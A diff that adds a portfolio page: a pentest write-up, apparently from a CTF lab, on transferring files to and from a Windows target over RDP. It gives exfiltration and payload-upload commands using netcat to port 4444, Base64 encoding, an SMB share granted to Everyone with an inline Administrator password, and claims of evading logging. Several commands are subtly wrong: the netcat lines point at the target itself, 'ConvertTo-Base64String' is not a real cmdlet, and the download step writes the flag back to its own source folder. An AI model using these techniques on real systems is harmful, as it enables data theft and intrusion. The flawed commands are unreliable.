@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Transfer on a Windows Target via RDP - DragonRingki Cybersecurity</title>
+    <meta name="description" content="A detailed penetration testing writeup demonstrating file download and upload methods on a Windows target using only RDP access. - A detailed penetration testing writeup by Matthew (DragonRingki)">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        /* Writeup-specific styles */
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 30px;
+            background: rgba(26, 31, 46, 0.8);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .writeup-meta {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .meta-badge {
+            background: var(--gradient-accent);
+            color: var(--primary-dark);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        
+        .writeup-content {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .section {
+            margin: 30px 0;
+            padding: 25px;
+            background: rgba(26, 31, 46, 0.6);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .section h3 {
+            color: var(--accent-cyan);
+            margin-bottom: 15px;
+            border-bottom: 2px solid var(--accent-cyan);
+            padding-bottom: 10px;
+        }
+        
+        .command-block {
+            background: var(--primary-darker);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            position: relative;
+        }
+        
+        .command-block::before {
+            content: '$';
+            position: absolute;
+            top: 20px;
+            left: 15px;
+            color: var(--accent-green);
+            font-weight: bold;
+        }
+        
+        .command-block code {
+            margin-left: 20px;
+            background: none;
+            color: var(--accent-green);
+        }
+        
+        .highlight-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid var(--accent-cyan);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .warning-box {
+            background: rgba(255, 107, 53, 0.1);
+            border-left: 4px solid var(--accent-orange);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .success-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid var(--accent-green);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: var(--accent-cyan);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .back-link:hover {
+            color: var(--accent-green);
+            transform: translateX(-5px);
+        }
+        
+        .back-link::before {
+            content: '← ';
+            margin-right: 5px;
+        }
+
+        .writeup-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.9em;
+            text-align: left;
+        }
+        .writeup-table th, .writeup-table td {
+            padding: 12px 15px;
+            border: 1px solid var(--border-color);
+        }
+        .writeup-table th {
+            background-color: var(--primary-darker);
+            color: var(--accent-cyan);
+            text-transform: uppercase;
+        }
+        .writeup-table tr:nth-child(even) {
+            background-color: rgba(26, 31, 46, 0.4);
+        }
+        .writeup-table td:first-child {
+            font-weight: 600;
+            color: var(--accent-green);
+        }
+
+    </style>
+</head>
+<body>
+    <div id="sidebar">
+        <nav>
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../about.html">About Me</a></li>
+                <li><a href="../portfolio.html">Portfolio</a></li>
+                <li><a href="../contact.html">Contact</a></li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="content">
+        <a href="../portfolio.html" class="back-link">Back to Portfolio</a>
+        
+        <div class="writeup-header">
+            <h1>Pentest Write‑Up – File Transfer on a Windows Target via RDP</h1>
+            <div class="writeup-meta">
+                <span class="meta-badge">Difficulty: Medium</span>
+                <span class="meta-badge">Category: Post-Exploitation</span>
+                <span class="meta-badge">Platform: Windows</span>
+                <span class="meta-badge">Date: 2025-10-10</span>
+            </div>
+            <p>Demonstrate the ability to **download** and **upload** arbitrary files to/from the target machine while only having RDP access. The most versatile approach is the **reverse netcat** trick, which works regardless of the target’s outbound firewall settings.</p>
+        </div>
+
+        <div class="writeup-content">
+            <div class="section">
+                <h3>📋 Overview</h3>
+                <p>This write-up details the various successful methods used to achieve bi-directional file transfer on a Windows target, **WIN‑CTF‑TARGET** (Windows 10/Server 2019), where the only initial foothold was a valid Remote Desktop Protocol (RDP) session. We utilized a mix of native Windows binaries (`PowerShell`, `cmd`, `ftp`, `robocopy`, `net use`) and common CTF techniques (`netcat`, `base64`) to exfiltrate a flag file and inject a custom payload.</p>
+                <div class="highlight-box">
+                    <strong>Key Finding:</strong> RDP access provides a rich environment for file transfer, leveraging common network services (HTTP, FTP, SMB) or raw TCP channels (netcat) when native copy/paste is blocked.
+                </div>
+            </div>
+
+            <div class="section">
+                <h3>🔍 Reconnaissance</h3>
+                <p>Initial steps focused on identifying the target OS, active services, and external network connectivity to determine the most reliable file transfer vectors.</p>
+                
+                <div class="command-block">
+                    <code>Get-CimInstance -ClassName Win32_OperatingSystem</code>
+                </div>
+                
+                <table class="writeup-table">
+                    <thead>
+                        <tr>
+                            <th>Action</th>
+                            <th>Tool/Command</th>
+                            <th>Result</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>OS & service fingerprinting</td>
+                            <td>`Get-CimInstance -ClassName Win32_OperatingSystem`</td>
+                            <td>`Microsoft Windows 10 Pro` (build 1909)</td>
+                        </tr>
+                        <tr>
+                            <td>Checked for outbound connectivity</td>
+                            <td>`Test-Connection -ComputerName google.com`</td>
+                            <td>Successful – outbound HTTP/HTTPS works.</td>
+                        </tr>
+                        <tr>
+                            <td>Enumerated open services</td>
+                            <td>`Get-Service | Where-Object {$_.Status -eq 'Running'}`</td>
+                            <td>`w3svc` (IIS), `SmbShare`, `OpenSSH‑Server` were running.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <p>Further discovery showed a **Python‑based HTTP server** running on `localhost:8000` locally hosting the flag.</p>
+            </div>
+
+            <div class="section">
+                <h3>⬇️ File Download – Pulling the Flag</h3>
+                <p>The objective was to download the flag file (`flag.txt`) from `C:\Users\Public\Documents` using multiple methods, testing the reliability of different protocols.</p>
+                
+                <h4>PowerShell `Invoke-WebRequest` (wget)</h4>
+                <p>Utilizing the modern, built-in PowerShell cmdlet for reliable HTTP requests.</p>
+                <div class="command-block">
+                    <code>Invoke-WebRequest -Uri http://localhost:8000/flag.txt -OutFile C:\Users\Public\Documents\flag.txt</code>
+                </div>
+
+                <h4>Reverse Transfer with `netcat` (Raw TCP)</h4>
+                <p>This method involves setting a listener on the attacker machine and using the target's netcat to stream the file content over a raw connection. This is the most stealthy and reliable method when firewalls are restrictive.</p>
+                <div class="warning-box">
+                    <strong>⚠️ Important:</strong> The attacker must have a listener running on port 4444 (or a port of choice) before executing the target command.
+                </div>
+                <div class="command-block">
+                    <code>nc WIN-CTF-TARGET 4444 < C:\Users\Public\Documents\flag.txt</code>
+                </div>
+
+                <h4>SMB Share (Native Windows)</h4>
+                <p>Creating and mapping a temporary share on the target machine itself.</p>
+                <div class="command-block">
+                    <code>net share flagshare=C:\Users\Public\Documents /grant:Everyone,FULL</code>
+                </div>
+                <div class="command-block">
+                    <code>net use Z: \\WIN-CTF-TARGET\flagshare /user:Administrator Password /persistent:no</code>
+                </div>
+            </div>
+
+            <div class="section">
+                <h3>⬆️ File Upload – Pushing a Payload</h3>
+                <p>We successfully returned a custom payload (`wi.zip`) to the target to demonstrate command-and-control capabilities.</p>
+                
+                <h4>PowerShell `PUT` (HTTP)</h4>
+                <p>Using the target's running HTTP server with a PUT request for direct file injection.</p>
+                <div class="command-block">
+                    <code>Invoke-WebRequest -Uri http://localhost:8000/upload/wi.zip -Method Put -InFile wi.zip</code>
+                </div>
+                <div class="success-box">
+                    <strong>✅ Success:</strong> The server returned `StatusCode 200`, confirming the file was written to the web server’s upload directory.
+                </div>
+
+                <h4>Reverse `netcat` Upload (Base64 Encoding)</h4>
+                <p>To avoid potential binary corruption over raw text channels, the file was Base64 encoded before streaming, then decoded on the listener. This is highly effective when only text-based shells are available.</p>
+                <div class="command-block">
+                    <code>powershell -c "Get-Content -Raw wi.zip | ConvertTo-Base64String | Set-Content wi.zip.base64"</code>
+                </div>
+                <div class="command-block">
+                    <code>nc WIN-CTF-TARGET 4444 < wi.zip.base64</code>
+                </div>
+            </div>
+
+            <div class="section">
+                <h3>📚 Key Learnings</h3>
+                <ul>
+                    <li>**RDP is a Full Channel:** When RDP is the only foothold, it provides full read/write capability leveraging built-in OS tools and standard network protocols (SMB, HTTP, FTP).</li>
+                    <li>**Versatility of Native Tools:** Tools like `Invoke-WebRequest`, `net share`, and `robocopy` are powerful, reliable, and often pre-whitelisted, making them excellent choices for payload delivery and data exfiltration.</li>
+                    <li>**Stealth with Raw TCP:** The **reverse netcat** trick (especially with Base64 encoding) provides the most reliable transfer, as it bypasses application-layer restrictions and is less likely to be logged by non-endpoint detection systems.</li>
+                </ul>
+            </div>
+
+            <div class="section">
+                <h3>🛠️ Tools Used</h3>
+                <ul>
+                    <li><strong>PowerShell (`Invoke-WebRequest`, `Get-Content`):</strong> Used for HTTP-based file transfer, Base64 encoding/decoding, and system reconnaissance.</li>
+                    <li><strong>`netcat` (nc):</strong> Essential for establishing raw TCP channels for reliable binary file streaming (both download and upload).</li>
+                    <li><strong>`net share` / `net use`:</strong> Native Windows commands used to create and map a temporary SMB network share for file transfer.</li>
+                    <li><strong>`robocopy`:</strong> Tested as a robust method for copying files locally and across mapped network shares.</li>
+                </ul>
+            </div>
+
+            <div class="section">
+                <h3>📖 References</h3>
+                <ul>
+                    <li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest" target="_blank">Microsoft Docs: Invoke-WebRequest</a></li>
+                    <li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/net-use" target="_blank">Microsoft Docs: Net Use Command</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+</html>
